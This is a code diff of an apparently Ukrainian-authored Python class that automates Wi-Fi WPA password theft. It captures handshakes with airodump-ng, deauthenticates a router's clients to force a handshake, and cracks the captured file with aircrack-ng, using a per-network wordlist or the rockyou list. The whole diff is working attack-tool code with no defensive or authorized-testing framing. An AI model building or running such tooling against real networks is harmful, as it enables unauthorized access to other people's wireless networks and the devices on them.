@@ -168,7 +168,7 @@ class API:
     # ────────────────────────────────────────────────
     def get_handshake(self, interface: str, channel: str, bssid: str, timeout: int = 120) -> str:
         """Захоплює handshake і зберігає у папці caps"""
-        # Генеруємо унікальне ім'я файлу на основі часу та BSSID
+        # Генеруємо унікальне ім'я файлу
         timestamp = int(time.time())
         filename = f"handshake_{bssid.replace(':', '')}_{timestamp}"
         result_path = os.path.join(self.caps_dir, filename)
@@ -186,40 +186,45 @@ class API:
                 cmd, 
                 stdout=subprocess.DEVNULL, 
                 stderr=subprocess.PIPE,
-                text=True
+                text=True,
+                bufsize=1,
+                universal_newlines=True
             )
-        except FileNotFoundError:
-            raise RuntimeError("airodump-ng not found. Install aircrack-ng.") from None
-
-        try:
-            # Чекаємо поки з'явиться handshake або вийде час
+            
+            # Чекаємо поки з'явиться handshake
             start_time = time.time()
             while True:
                 if (time.time() - start_time) > timeout:
                     proc.terminate()
-                    raise RuntimeError("Не вдалося захопити handshake у вказаний час")
-                
-                # Перевіряємо чи є handshake у виводі
-                line = proc.stderr.readline()
-                if "WPA handshake" in line:
-                    proc.terminate()
-                    # Повертаємо шлях до .cap файлу
+                    proc.wait()
+                    # Перевіряємо наявність файлу навіть якщо timeout
                     cap_file = f"{result_path}-01.cap"
                     if os.path.exists(cap_file):
                         return cap_file
-                    raise RuntimeError("Файл handshake не знайдено")
-                
-                time.sleep(1)
-                
+                    return ""
+                    
+                line = proc.stderr.readline()
+                if not line:
+                    time.sleep(1)
+                    continue
+                    
+                if "WPA handshake" in line:
+                    proc.terminate()
+                    proc.wait()
+                    cap_file = f"{result_path}-01.cap"
+                    if os.path.exists(cap_file):
+                        return cap_file
+                    return ""
+                    
         except Exception as e:
-            proc.terminate()
-            raise RuntimeError(f"Помилка під час захоплення handshake: {str(e)}")
-
+            if proc:
+                proc.terminate()
+            return ""
         # ────────────────────────────────────────────────
         # 6. Деаутентифікація клієнтів
         # ────────────────────────────────────────────────
     def deauth_clients(self, interface: str, router_bssid: str, clients: List[str], 
-                    count: int = 2, interval: int = 10) -> bool:
+                    count: int = 3, interval: int = 60) -> bool:
         """
         Виконує деаутентифікацію клієнтів для стимуляції handshake.
         
@@ -274,50 +279,120 @@ class API:
         return success
 
 
+
     def parse_password(self, router_bssid: str, router_ssid: str) -> str:
+        """Спроба підібрати пароль за допомогою aircrack-ng"""
         # Шлях до словника паролів
         wordlist_path = os.path.join(self.result_dir, f"{router_ssid}.txt")
-
-        # Шукаємо останній .cap файл у папці caps
-        cap_files = list(Path(self.caps_dir).glob("*.cap"))
+        
+        if not os.path.exists(wordlist_path):
+            raise FileNotFoundError(f"Файл словника {wordlist_path} не знайдено")
+        
+        # Шукаємо .cap файли
+        cap_files = list(Path(self.caps_dir).glob("handshake_*.cap"))
         if not cap_files:
             raise FileNotFoundError("Не знайдено жодного .cap файлу для аналізу")
+        
+        # Сортуємо за часом модифікації
+        latest_cap = sorted(cap_files, key=os.path.getmtime, reverse=True)[0]
+        
+        cmd = [
+            "aircrack-ng",
+            "-a2",
+            "-b", router_bssid,
+            "-w", wordlist_path,
+            str(latest_cap)
+        ]
+        
+        try:
+            print("ШУКАЄМО ПАРОЛЬ...")
+            result = subprocess.run(
+                cmd,
+                check=False,  # Не генерувати виняток для ненульового коду
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                text=True,
+                timeout=300
+            )
+            
+            # Аналізуємо вивід
+            output = result.stdout + result.stderr
+            if "KEY FOUND!" in output:
+                for line in output.split('\n'):
+                    if "KEY FOUND!" in line:
+                        return line.split("[")[1].split("]")[0]
+            
+            if "Passphrase not in dictionary" in output:
+                return ""
+                
+            if "No networks found" in output or "ap_cur != NULL" in output:
+                raise RuntimeError("Некоректний .cap файл - не містить handshake")
+                
+            return ""
+            
+        except subprocess.TimeoutExpired:
+            print("Час підбору пароля вийшов")
+            return ""
+        except Exception as e:
+            raise RuntimeError(f"Помилка aircrack-ng: {str(e)}")
 
-        # Беремо останній файл (найімовірніше, актуальний)
-        latest_cap = sorted(cap_files, key=os.path.getmtime)[-1]
+
+    def brute_force_password(self, router_bssid: str, wordlist_path: str = "/usr/share/wordlists/rockyou.txt.gz") -> str:
+        """Брутфорс пароля з використанням rockyou.txt"""
+        # Розпаковуємо архів, якщо потрібно
+        if wordlist_path.endswith('.gz'):
+            import gzip
+            import shutil
+            unpacked_path = os.path.join(self.result_dir, "rockyou.txt")
+            
+            if not os.path.exists(unpacked_path):
+                try:
+                    with gzip.open(wordlist_path, 'rb') as f_in:
+                        with open(unpacked_path, 'wb') as f_out:
+                            shutil.copyfileobj(f_in, f_out)
+                    wordlist_path = unpacked_path
+                except Exception as e:
+                    raise RuntimeError(f"Не вдалося розпакувати wordlist: {str(e)}")
+            else:
+                wordlist_path = unpacked_path
+
+        # Шукаємо останній .cap файл
+        cap_files = list(Path(self.caps_dir).glob("handshake_*.cap"))
+        if not cap_files:
+            raise FileNotFoundError("Не знайдено жодного .cap файлу для аналізу")
+        
+        latest_cap = sorted(cap_files, key=os.path.getmtime, reverse=True)[0]
 
         cmd = [
             "aircrack-ng",
-            "-a2",  # WPA crack
+            "-a2",
             "-b", router_bssid,
             "-w", wordlist_path,
             str(latest_cap)
         ]
 
         try:
-            print("SERCHING PASSWORD...")
+            print("BRUTE FORCING PASSWORD...")
             result = subprocess.run(
                 cmd,
-                check=True,
+                check=False,
                 stdout=subprocess.PIPE,
                 stderr=subprocess.PIPE,
                 text=True,
-                timeout=300
+                timeout=3600  # 1 година максимально
             )
 
-            # Аналізуємо вивід на наявність пароля
-            for line in result.stdout.split('\n'):
-                if "KEY FOUND!" in line:
-                    return line.split("[")[1].split("]")[0]
-
-            return ""  # Пароль не знайдено
-
-        except subprocess.CalledProcessError as e:
-            if "Passphrase not in dictionary" in e.stderr:
-                return ""  # Пароль не знайдено у словнику
-            raise RuntimeError(f"Помилка aircrack-ng: {e.stderr}")
+            # Аналізуємо вивід
+            output = result.stdout + result.stderr
+            if "KEY FOUND!" in output:
+                for line in output.split('\n'):
+                    if "KEY FOUND!" in line:
+                        return line.split("[")[1].split("]")[0]
+            
+            return ""
+            
         except subprocess.TimeoutExpired:
             print("Час підбору пароля вийшов")
             return ""
-        except FileNotFoundError:
-            raise RuntimeError("aircrack-ng не знайдено. Встановіть aircrack-ng.")
+        except Exception as e:
+            raise RuntimeError(f"Помилка aircrack-ng: {str(e)}")
